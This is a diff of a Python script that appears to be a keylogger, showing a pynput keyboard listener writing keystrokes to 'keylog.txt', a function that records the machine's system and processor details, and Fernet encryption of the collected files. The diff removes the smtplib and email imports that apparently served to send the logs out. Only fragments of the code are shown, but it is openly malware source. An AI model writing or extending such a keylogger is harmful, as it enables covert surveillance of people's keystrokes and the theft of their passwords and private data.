@@ -13,11 +13,6 @@ import wmi #This will only work on windows
 import platform #This allows me to find information about the computer
 from pynput import keyboard #importing the pynput library
 from cryptography.fernet import Fernet #This is for encryption
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 
 file_list=[] # this list stores the files that will be encrypted
 log_file='keylog.txt'
@@ -32,7 +27,6 @@ def main():
     listener.start()
     input()
     
-
 def key_Generator(): #This function generates the key for encryption
     key = Fernet.generate_key()
     with open('key_encrypt.key', 'wb') as key_file:
@@ -68,9 +62,7 @@ def on_release(key):
         encryptor() #This function encrypts the files
         print("Closing the listener")
         sys.exit()
-        
-        
-
+       
 def system_info():
     #This function logs the system information into a different file that will be created
     global file_list
@@ -82,12 +74,10 @@ def system_info():
 Release:{system_info.release}\nVersion:{system_info.version}\n\
 Machine:{system_info.machine}\nProcessor:{system_info.processor} {proc_info.Name}\n")
 
-
 def convert(key): #This converts the key to a number and returns it
     numConvert = {"<96>":"0","<97>":"1","<98>":"2","<99>":"3","<100>":"4","<101>":"5","<102>":"6","<103>":"7","<104>":"8","<105>":"9"}
     if str(key) in numConvert:
         return numConvert[str(key)]
-
 
 def encryptor():
     #This function encrypts the file
